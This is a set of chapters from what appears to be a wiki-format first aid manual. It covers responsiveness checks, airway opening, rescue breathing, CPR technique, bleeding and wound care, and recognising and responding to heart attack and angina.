The word &quot;pain&quot; is a bit misleading - it refers to anything physical you do to elicit a response from your victim. The first, and most gentle stimulus to use is a tap/shake of the shoulder. There are other, more painful stimuli that can be employed should this be unsuccessful, but all of these have their downsides, especially if overused.

Of these, the three most commonly used ones are:

* '''Sternal rub''' - This is performed by grinding the knuckles of your clenched fist vertically up and down the victim's sternum (or breastbone).  
* '''Nail bed squeeze''' - Using the flat edge of a pen or similar object, squeeze in to the bottom of the victim's fingernail or toenail.
* '''Ear lobe squeeze''' - using thumb and forefinger, squeeze or twist the victim's ear.

If any of these provoke a reaction (groaning, a movement, fluttering of the eyes), then they are responsive to pain. It is important to note that different trainers have different opinions on the efficacy of these, so ask your trainer before employing any of these on a first aid course.

Any of the responses A, V or P, mean that the victim has some level of consciousness.  If they are not alert, you should ''always'' summon professional help - call an ambulance.

If they are only responsive to Voice or Pain, then consider using the '''Recovery position''' to help safeguard them if they need to vomit.

If they do not respond to voice or pain, then they are '''Unresponsive''' and you must urgently perform further checks on their key life critical systems of breathing and circulation (informally known as the ABCs). A victim who is unresponsive will often require special attention, both due to the injury or illness causing their unconsciousness, and the fact that they are unable to provide any reason for them being sick or injured.

===Summary===

To this stage the first aider, on approaching a victim should have:
*'''GO''' - Put their '''g'''loves '''o'''n
*'''D''' - Checked for '''d'''anger
*'''R''' - Checked for '''r'''esponsiveness
*'''S''' - Looked at the '''s'''cene for clues about what has happened
*'''H''' - Gained '''h'''istory on the incident
*'''AVPU''' - Assessed to see how responsive the victim is.

This can be remembered as the mnemonic '''&quot;GO DR SHAVPU&quot;''' (Go Doctor Shavpu)

==Next Steps==
If the victim is unconscious, the first aider should immediately '''call an ambulance''' - you will need professional help regardless of whether they are breathing or not. Waiting would endanger the victim's life unnecessarily, and any time wasted in summoning help is time lost. If you are alone with an adult victim, call immediately, even if you must leave the victim. Placing them into the recovery position will help prevent them from choking if they should vomit while you are calling the ambulance. If you are alone with an unconscious child, continue your primary assessment; you will call once you have confirmed that the victim is breathing, or after 2 minutes of CPR.
If you are not alone, have a bystander call the ambulance immediately while you continue your assessment and care of the victim.

If there is more than one person injured the rescuer must determine the order in which victims need care. In general, rescuers should focus on the victim with the injury that is the greatest threat to life. Simple [[First Aid/Triage|triage]] techniques should be applied to make sure that those in greatest need of care receive support quickly.

==Treatment==
The last step is to actually provide care to the limits of the first aider's training -- ''but never beyond''. In some jurisdictions, you open yourself to liability if you attempt treatment beyond your level of training.

Treatment should always be guided by the 3Ps:
:'''P'''reserve life
:'''P'''revent further injury
:'''P'''romote recovery

Treatment will obviously depend on the specific situation, but some situations will always require treatment (such as shock). The level of injury determines the level of treatment required.

The principles '''first, do no harm''' and '''life over limb''' are essential parts of the practice of first aid. Do nothing that causes unnecessary pain or further injury unless to do otherwise would result in death.

==A for Airway==
[[Image:Tongue-blocking-airways.png|thumb|The head-tilt chin-lift opens the airway safely and effectively.]]
The complex structures of the human body leading from the lips to the lungs are often referred to simply as the patient's &quot;airway&quot;. The airway of the human body is one of the more important parts to be checked when providing first aid, and is typically the first item given attention in the seriously sick or injured patient. The airway is the entrance point of oxygen and the exit point of carbon dioxide for the body. Should this become blocked, the victim will have no way to obtain fresh air, and death will eventually result.

We are normally able to keep our airway a clear path for fresh air subconsciously. Depending on the severity of the victim's condition, an unconscious person's airway could be blocked when their tongue relaxes and falls across their throat, blocking airflow. A common example of this is the sounds made by a snoring person. The technique used to open the airway and keep the tongue out is referred to as the &quot;head-tilt chin-lift&quot; technique. 


For this to work properly, the patient will be placed on a flat surface, lying on their back. Kneeling at the level of the victim, the rescuer places one palm, open handed, on the victim's forehead. The rescuer then places the index and middle finger of their other hand under the bony part of the victim's jaw. The fingers and palm are used to gently rock the victim's head backwards, and lift their chin upwards, extending the victim's neck. Ideally, once you have done this, the victim's jawline will be perpendicular to the ground.

This technique is typically not necessary for conscious victims, as they can typically maintain an open airway. Simply, if the victim is talking or has no respiratory distress, their airway is adequate.

Even if you suspect that your victim may have sustained a spinal neck injury, open the airway as normal. ''Life over limb'' - the potential for keeping the victim alive outweighs the risk of aggravating the spinal injury. If you absolutely must roll a person suspected of head, neck, or spinal injury because he or she is vomiting, choking on blood or in danger of further injury, use at least two people. Work together to keep the person's head, neck and back aligned while rolling the person onto one side.

You may also check the victim's mouth for visible, removable obstructions in the mouth which can obstruct airflow. The common items found obstructing the victim's airway include partially chewed food, hard candy, and balloons. You may attempt to expel any items in the mouth which can be easily withdrawn, but do not waste time trying to remove fixed or lodged items such as dentures. Also, be alert to the status of your victim, as you could be injured if your fingers are in the mouth of a person regaining consciousness. 

If a conscious victim's airway is obstructed by a foreign object (such as someone who is choking), the object must be removed via other means. [[First Aid/Obstructed Airway#Conscious victims|Abdominal thrusts]] are the standard method for conscious victims. Refer to [[First Aid/Obstructed Airway#Unconscious victims|Obstructed Airway]] for unconscious procedures.

== Principles ==
Humans breathe by inhaling fresh air into the lungs, exchanging part (but not all) of the oxygen in it with unneeded carbon dioxide, and exhaling the spent air. Blood vessels located in the lungs distribute oxygen throughout the cells of the body. Human beings typically have a lung capacity of 4 to 6 liters.

When someone stops breathing, this is a life threatening condition known as respiratory arrest. Occasionally when a victim stops breathing, their 
breathing can restart if stimulated by a rescuer blowing air into their lungs. However, a victim in respiratory arrest is likely to fall into ''cardio-respiratory'' arrest, which means that they are no longer breathing and their heart has also stopped.

Without their lungs receiving oxygen, a victim will suffer permanent brain damage after only a few minutes. Because of this, it is crucial that rescuers provide rescue breathing (ventilation) quickly and correctly.

== Checking the respiration ==
{{FA Regional Note|In some areas, trainers advocate calling emergency medical services as soon as you find a patient unconscious (''&quot;call first&quot;''), but the ILCOR protocol is to call EMS once you determine whether the victim is breathing or not (''&quot;call fast&quot;'').  This ensures that the correct priority is given to your call.  You should summon an ambulance in either case if the patient is unconscious.}}

After opening the victim's airway, check to see if the victim is breathing. To do this, place your cheek in front of the victim's mouth (about 3-5 cm away) while looking down their chest (towards their feet). If desired, you can
also gently place a hand on the center of the victim's chest. This allows you to observe whether the victim is breathing in the following ways:
# You may '''Feel''' the victim's breath against your cheek.
# You may '''Hear''' the air entering or escaping your victim's lungs.
# You may '''See''' the chest rise and fall with each breath.
# You may '''Smell''' the breath of the victim as they exhale.

If you have placed your hand on the victim's chest, you may also feel their chest rise and fall against your hand. Search for these signs for 10 seconds. If there is no breathing (or it is slower than 6 times per minute), your victim is not adequately moving air in and out of their body. In order to help them, you must perform rescue breathing.
{{-}}

==Calling For Help==
If a bystander has not already summoned assistance, now is the time to make sure that emergency personnel are enroute (known as EMS, Ambulance Service, Rescue Squad, or Paramedics depending on the region).
Ideally, someone else will be able to make the call while you continue aid.. If you're alone, you must stop and call yourself.
* Europe: 112
* USA &amp; Canada: 911
* Australia: 000
* United Kingdom: 999
	 
You will need to give the emergency services:
* Your exact location (including apartment number, suite, building, etc.)
* The illness or injury that the victim is having (to the best of your knowledge).
* A telephone number you can be contacted back on (for instance, if they have difficulty finding you)
	 
In some cases, the person taking your call will run through a list of questions with you in order to make sure the proper resources are sent to you. Also, some localities will give the caller instructions on what to do before help arrives.
	 
Sometimes, the victim must be left unattended while the first aider leaves to seek help for them. If the victim is unconscious they should be left in the recovery position so they do not choke if they vomit. However, if you suspect the victim has an injury to their neck or back, they should not be moved and their head kept stationary, with two exceptions. One, if the victim is in immediate danger (such as from a fire), they should be moved regardless. Two, if the victim is unconscious, the threat of choking outweighs the potential injury to their neck or back, and they should be placed on their side anyway. There are alternative methods for safer positioning available to those with more advanced training.(See [[First Aid/Suspected Spinal Injury| Suspected Spinal Injury]] for more information.)

== Rescue Breaths ==
{{FA Regional Note|In Europe, give 5 rescue breaths for victims of:&lt;br&gt;&lt;ul&gt;&lt;li&gt;Drowning&lt;li&gt;Trauma&lt;li&gt;Drug overdose&lt;/ul&gt;&lt;br&gt;For other victims, begin with [[First Aid/C for Compressions|compressions]] instead of rescue breaths.}}
Rescue breaths must be provided to victims in a state of respiratory arrest; ''do not'' provide them to a weakly breathing victim. If you cannot detect the breath of the victim, or they are breathing slower than once every ten seconds, begin rescue breathing.

If you have a CPR mask or other barrier device, you can use it to protect yourself and the victim from exchange of body fluids. Cheap, keyring-sized CPR masks are available in most pharmacies. Be sure to read the instructions and practice with any equipment you buy. In the event you do not have a barrier device, the rescuer should perform as best they can, given the situation and abilities. If you are uncomfortable performing direct mouth-to-mouth on a stranger, or you find blood or other bodily fluids present, you are not obligated to. You should, however, perform the chest compression portion of CPR, as it is better than doing nothing.

The 2010 CPR guidelines changed CPR so compressions are started first, after checking for breathing. 

To give two rescue breaths:
* Kneel at the level of the victim, perpendicular to and facing them.
* Maintain an open airway using the head-tilt chin-lift
* Squeeze the nose of the victim with your free hand to seal it shut.
* Put your mouth on the mouth of the victim in an airtight manner, and blow into the mouth of the victim so that their chest beings to rise. Never blow forcefully, as this may cause the air to enter the stomach and not their lungs. Instead, exhale smoothly over 1-2 seconds.
* Remove your mouth, and let the victim exhale completely (watch for their chest to fall).
* Repeat the above steps for your second breath.

If your breaths do not go in easily, or the victim's chest did not rise, the airway could have again become closed. Open the airway once again with the head-tilt chin-lift technique and try again, making sure the victim's neck is extended and their head is rocked back fully.

==Principles==
[[Image:Diagram of the human heart (cropped).svg|thumb|Schematic of the human heart.]]
The human heart is an electro-mechanical pump, circulating nourishing blood throughout the body. If beating stops, the brain, lungs and even the heart itself stop receiving oxygen and perish. Rescuers can use a technique called chest compressions to squeeze the heart from outside the patient's chest, helping to circulate blood around. When performing chest compressions during CPR, you are helping move the oxygen you delivered through rescue breathing where it is needed. 

Chest compressions are often started before any other intervention in an emergency setting, because even blood that has already passed through the body has oxygen remaining to be used. Using compressions to pump that existing blood around can help buy the patient more time. This is the reason that CPR can be done &quot;compression only&quot;, or without rescue breathing. Once compressions start, they must continue for as long as possible.

==Technique==
The goal is always to compress in '''the center of the chest''', regardless of the shape or size of the patient.  This means that compressions are to performed on the sternum or breastbone of the patient, in line with the casualty's armpits or nipple line. 

[[Image:CardiopulmonaryResuscitationBabyDummy.jpg|thumb|Compressions for infant CPR are done with two fingers only.]]
*'''For adults (&gt;8)''' - place the heel of one hand in the centre of the chest, approximately between the nipple line (on adult males - for females, you may need to approximate the ideal position of this line due to variations in breast size and shape).  You may also use the bottom of the casualty's armpits as a reference mark. Bring your other hand to rest on top of the first hand, and interlock your fingers.  Bring your shoulders directly above your hands, keeping your arms straight. You should then push down firmly onto the heel of the lower hand, depressing the chest 5-6cm (2-2.5inches).
*'''For children (1-8)''' - place the heel of one hand in the centre of the chest, approximately between the nipple line.  Bring your shoulder directly above your hand, with your arm straight, and perform compressions to at least one third (1/3) the depth of the chest with one arm only.
*'''For infants (&lt;1yr)''' - Use your forefinger and middle finger only.  Place your forefinger on the centre of the child's chest between the nipples, with your middle finger immediately below it on the chest, and push downwards using the strength in your arm, compressing the chest at least one third (1/3) of its depth. For newborns and small infants, you can hold the child in your opposite arm (head in your palm, feet at your elbow) for easier access.

'''Give 30 compressions in a row, and then two (2) rescue breaths'''.

'''Then restart your next cycle of compressions'''

==Making compressions effective==
'''You MUST allow the ribs to come all the way back out after each compression''', followed by a brief pause.  This allows the heart's chambers to refill.  Spacing compressions too close together will lead to them being ineffective.

'''You are aiming for a rate of 100 compressions per minute''', which includes the time to give rescue breaths.  In practice, you should get just over 2 cycles of 30 compressions in along with breaths per minute.  

'''Almost everyone compresses the chest too fast''' - Experience shows that even well trained first aiders tend to compress the heart too fast.  The rate you are aiming for is only a little over one per second.  The best equipped first aid kits should include a Metronome with an audible 'beep' to match your speed to.  Many public access defibrillators have these included in their pack. If one is not available, count the number of compressions with the word 'and' between them. When you press down on the chest, say the number, when the chest rises say 'and'. this way, you will be saying 'one-and-two-and-three...'

'''The patient should be on a hard surface''' - If the patient is in bed or a similar cushioned area, moving them to the floor will help assure you are compressing their chest and not the mattress or couch cushions. If moving the casualty is impractical, a hard, flat board can be placed behind them to make compressions more effective.

'''Keep your arms straight''' - A lot of television and films show actors 'performing CPR' bending their elbows.  This is not effective - you should always keep your arms straight, with your elbows locked and directly above your hands.

'''It often helps to count out loud''' - You need to try and get 30 compressions per cycle, and it helps to count this out loud or under your breath. In such a stressful situation, you will be anxious and unable to count out loud for the duration, but ensure you keep counting, even if it's in your own mind. 

'''If you lose count, don't stop, just estimate''' - It is important to carry on once you've started, so if you lose count, don't panic, and simply estimate when 30 compressions is over, and do 2 breaths, then start over counting again. Avoid any interruptions in CPR.

'''You are likely to break ribs''' - When performing compressions, especially on the elderly, you may find yourself breaking the patient's ribs. This often feels like flicking the finger of one hand against the palm of another. This is to be expected during CPR, and you should carry on regardless.  It is a sign that you are performing good, strong compressions. Oftentimes the cracking sound you will hear is just the cartilage of the ribs and sternum breaking, and not the bones themselves. If bystanders are concerned about injury to the patient, you may want to remind them of the ''life over limb'' principle and assure them that it is a normal occurrence, and what you are doing is critically important.

'''Chest compressions are tiring''' - This is especially true if you are performing both rescue breathing and compressions by yourself. Studies show that the efficacy of CPR drops when one rescuer performs compressions for an extended time. Hospital emergency rooms switch personnel performing compressions often for this reason. If you are with someone else trained in CPR, rotate between compressions and rescue breaths

==When to Stop==
You should continue giving the patient CPR until:
* '''The casualty starts breathing spontaneously''' - This occurs very infrequently, and does not include gasping, called ''agonal breathing''.  Patients are also likely to make sighing noises or groans as you perform chest compressions - this is just the sound of air trapped in the lungs being forced out, and you should not stop CPR if these noises are heard.
* '''The patient vomits''' - This is an ACTIVE mechanism, meaning the patient moves and actively vomits.  Not to be confused with regurgitation, where stomach contents make their way passively in to the mouth. If the casualty vomits, roll them to their side, clear the airway once they're done vomiting and reassess ABCs. Vomit is obviously undesirable for the person performing CPR. Attempt to clear the mouth with your fingers (preferably while wearing a barrier device) and continue CPR. If you are without barrier device and feel uncomfortable giving rescure breaths, give chest compressions only.
*'''Qualified help arrives''' and takes over.  This could be a responder with a defibrillator, the ambulance service or a doctor.  DO NOT STOP until instructed to.  They are likely to require time to set up their equipment and evaluate the patient (as you did at first) and you should continue with CPR until instructed to stop.  The emergency medical personnel are used to working around people, and may do things like place defibrillator patches while you continue. By continuing CPR, you are keeping the medical personnel free to perform other tasks.
*'''You are unable to continue''' - CPR is physically very demanding, and continued periods can be exhausting.  Try to change places frequently with another trained rescuer to lessen the chance of exhaustion. 
*'''You put yourself in danger by continuing''' - Hazards may change, and if your life is endangered by a new hazard, you should stop CPR. If possible, remove the patient from the hazardous situation as well, but never at the risk of your own life or health.

==Introduction==
[[Image:Road rash on shoulder.jpg|thumb|[[w:Road rash|Road rash]] can vary in severity; here it caused some minor bleeding and fluid discharge.]]
Bleeding is a common reason for the application of first aid measures and can be internal or external.  The principle difference is whether the blood leaves the body - external bleeding can be seen, whereas in internal bleeding, no blood can be seen.  

There are many causes of external bleeding, which fall in to seven main categories, which are:
* '''Abrasion''' - Also called a graze, this is caused by transverse action of a foreign object against the skin, and usually does not penetrate below the epidermis
* '''Excoriation''' - In common with Abrasion, this is caused by mechanical destruction of the skin, although it usually has an underlying medical cause
* '''Laceration''' - Irregular wound caused by blunt impact to soft tissue overlying hard tissue or tearing such as in childbirth
* '''Incision''' - A clean 'surgical' wound, caused by a sharp object, such as a knife
* '''Puncture Wound''' - Caused by an object penetrated the skin and underlying layers, such as a nail, needle or knife
* '''Contusion''' - Also known as a bruise, this is a blunt trauma damaging tissue under the surface of the skin
* '''Gunshot wounds''' - Caused by a projectile weapon, this may include two external wounds (entry and exit) and a contiguous wound between the two

Recognizing external bleeding is usually easy, as the presence of blood should alert you to it.  It should however be remembered that blood may be underneath or behind a victim.   It may be difficult to find the source of bleeding, especially with large wounds or (even quite small) wounds with large amounts of bleeding.  If there is more than 5 cups of bleeding, then the situation is life-threatening.

{{FA Caution|Put gloves on before coming into contact with any blood or body fluids.}}
As with all first aid situations, the priority is to protect yourself, so put on protective gloves before approaching the victim.  

All external bleeding is treated using three key techniques, which allow the body's natural repair process to start.  These can be remembered using the acronym mnemonic 'RED':

:'''R'''est
:'''E'''levation
:'''D'''irect pressure

===Rest===
In all cases, the less movement the wound undergoes, the easier the healing process will be, so rest is advised.
Rest will also reduce the pulse rate, thus the severity of the bleeding, especially in the case of arterial bleeding.

===Elevation===
[[Image:Direct-pressure-and-elevation.jpg|thumb|left|A rescuer applying direct pressure and elevating the arm for an arm laceration.]]
Direct pressure is usually enough to stop most minor bleeds, but for larger bleeds, it may be necessary to elevate the wound above the level of the heart (whilst maintaining direct pressure the whole time).  This decreases the blood flow to the affected area, slowing the blood flow, and assisting clotting.

Elevation only works on the peripheries of the body (limbs and head) and is not appropriate for body wounds.  You should ask the victim to hold their wound as high as possible.  You should assist them to do this if necessary, and use furniture or surrounding items to help support them in this position.   If it is the legs affected, you should lie them on their back (supine), and raise their legs.

===Direct Pressure===
The most important of these three is direct pressure.  This is simply placing pressure on the wound in order to stem the flow of blood.  This is best done using a dressing, such as a sterile gauze pad (although in an emergency, any material is suitable).  

If the blood starts to come through the dressing you are using, add additional dressings to the top, to a maximum of three.  If you reach three dressings, you should remove all but the one in contact with the wound itself (as this may cause it to reopen) and continue to add pads on top.  Repeat this again when you reach three dressings.  The reason for not simply adding more dressings is that it becomes harder to apply the direct pressure which is clearly needed if this much blood is produced.

Where an articulate area of the body is wounded (such as the arms or hands), it is important to consider the position of the area in keeping pressure on the wound.  For example, if a hand is cut 'across' from the thumb to halfway across the palm, the wound can be closed with direct pressure by simply clasping the victim's hand shut.  However, if the hand was wounded from between the two middle fingers down to the wrist, closing the hand would have the effect of opening the wound, and so the victim should have their hand kept flat.

In most cases, during the initial treatment of the bleed, you will apply pressure by hand in order to stem the flow of blood.  In some cases, a dressing may help you do this as it can keep pressure consistently on the wound.  If you stop the flow by hand, you should then consider dressing the wound properly, as below.

==Dressing==
Once the bleeding is slowed or stopped, or in some cases, to assist the slowing of the blood flow you should consider dressing the wound properly.

To dress a wound, use a sterile low-adherent pad, which will not stick to the wound, but will absorb the blood coming from it.  Once this is in place, wrap a crepe or conforming bandage around firmly.    It should be tight enough to apply some direct pressure, but should not be so tight as to cut blood flow off below the bandage.  A simple check for the bandage being too tight on a limb wound is a capillary refill check; to do this,  hold the hand or foot (dependent on what limb is injured) above the level of the heart and firmly pinch the nail.  If it takes more than 2 seconds for the pink color to return under the nail, then the bandage is likely to be too tight.

If the blood starts to come through the dressing you have applied, add another on top, to a maximum of three. If these are all saturated, remove the top two, leaving the closest dressing to the wound in place. This ensures that any blood clots that have formed are not disturbed; otherwise, the wound would be opened anew.

==Special cases==
===Nosebleeds (epistaxis)===
If a person has nosebleed, have them pinch the soft part of the nose firmly between thumb and forefinger, just below the end of the bone.  If necessary, do this yourself, but it is preferable to have them do it themselves if they are able to do it effectively.  

The victim should lean their head slightly forward and breathe through their mouth.  You can also leave the head in a neutral position, but '''never tilt the head back'''.  Tilting the head forward ensures that blood isn't ingested (as it can cause vomiting) or inhaled (choking hazard).

If you are unsuccessful at stopping the bleeding after 10 minutes of direct pressure, you should assess the blood flow.  If the blood flow is minor, you could consider using an ice pack on the bridge of the nose to help stem the flow.  

If the nose continues to bleed with a fast flow, you should seek medical assistance, probably from the ambulance.

===Embedded Objects===
'''If there is something embedded in the wound, do not remove it.''' Instead, apply pressure ''around'' the object using sterile gauze as described above.  Rolled bandages are perfect for this.  Be careful not to disturb the object, as moving it may exacerbate the bleeding.
This doesn't apply to superficial splinters and such.  A useful rule of thumb: if it's causing bleeding, '''''don't remove it.'''''  If it isn't, feel free. Apply pressure and secure with bandages then get medical aid.

===Stab, puncture or gunshot wounds to the body===
These wounds are life threatening, and after assessing the ABCs of the victim, you should immediately summon an ambulance.  As always, you should check that you are not in danger when approaching these victims (from someone with a knife or gun, for instance).  As with all embedded objects, ensure you do not remove the item from the body.

If possible, you should sit the victim up (as blood in the body will go to the lowest point, allowing the heart and lungs to work as efficiently as possible).  You should also lean them to the injured side, keeping the healthy side free from incursion by blood.

Assess the victim for [[First Aid/Chest &amp; Abdominal Injuries#Open Chest Wounds|open chest wounds]] or [[First Aid/Chest &amp; Abdominal Injuries#Abdominal Injuries|abdominal injuries]], and treat accordingly.

===Amputations===
If a body part has been amputated, immediately summon ambulance assistance, and '''treat the wound for bleeding first''' as above. Cover the amputated part with a moist dressing and place it in a clean plastic bag, and place this bag into a bag of ice and water, sending it with the victim to the hospital (it should be labeled with their name, and where it belongs). You should avoid putting the part in direct contact with ice, as this can cause irreparable damage, meaning that surgeons are unable to reattach it.

If the body part is partially amputated, do not detach, but treat as a wound.

==Introduction==
[[Image:Heart attack diagram.png|thumb|Heart attack can be caused by blockage in arteries supplying blood to the heart.]]
'''Heart attack''' (myocardial infarction) is when blood supply to the heart or part of the heart is cut off partially or completely, which leads to death of the heart muscle due to oxygen deprivation.  Heart attacks usually occur after periods of rest or being recumbent, and only rarely occur after exercise (despite popular portrayal).

'''Angina''' (angina pectoris) is a 'miniature heart attack' caused by a short term blockage.  Angina almost always occurs after strenuous exercise or periods of high stress for the victim.

The key differentiation between a heart attack and angina is that, in line with their typical onset modes, angina should start to relieve very shortly after resting (a few minutes), whereas a heart attack will not relieve with rest. 

Pain in the chest can have many different causes and you should not attempt to distinguish between them. Always err on the side of caution and call for help when encountering a person with chest pain.  This is absolutely crucial if the victim has had heart problems in the past.


;

==Recognition==
*Chest pain: tightness, pressure, or pain in the chest (often described as &quot;crushing&quot;) 
*Back pain: above or between the shoulder blades, often radiating into the left arm, and the jaw
*Nausea or indigestion (especially in women)
*Pale, cool, clammy skin
*Ashen grey skin
*Impending sense of doom
*Denial
*History of a similar episode earlier that &quot;just went away&quot;

While some people will show typical signs of a cardiac emergency, others will show none at all. This is especially true of women in general, and both men and women with diabetes.

==Treatment==
'''Call for assistance.''' A possible cardiac problem is serious, and should never be ignored or passed of as insignificant.
'''Assist the victim with medication''', only if it is prescribed to them.  People with angina will often have medication to control it; either as pills or a spray. This medicine (nitroglycerin) is commonly referred to as &quot;nitro&quot;, The pills should never be touched with bare skin by the rescuer, as they will be absorbed directly through skin. These pills are placed directly under the tongue for absorption, never chewed or swallowed, and while the victim is seated. The spray should be taken on the bottom of the tongue, and should also be kept away from bare skin. '''Only the victim should administer his medication'''. This includes over the counter medications such as aspirin. Giving medication to someone in an emergency is much more complicated than handing the victim a pill, and should only be done by medical professionals. If he is unable to do so, then the rescuer should not do it for him, Helping to take the lid off or handing the bottle to the victim is acceptable. The names of the medications and times taken should be documented if patient is transferred to other rescuers.
*'''Loosen tight clothing''', especially around the neck to help the victim relax, and help medical personnel access the chest
*'''Help the victim sit reclined''', with the body leaned back at about 45 degrees, with feet on the floor, but knees raised - this puts the patient in a 'W' position. Getting the victim comfortable without straining is more important than the position.
*'''Avoid giving food or drink''' which can complicate some treatments. If the victim complains of thirst, small sips of plain water or ice are acceptable.
*'''Be vigilant for any changes in condition''' which can occur rapidly and without warning
*'''Be prepared to do [[First Aid/CPR summary|CPR]]''' should the victim go into cardiac arrest.
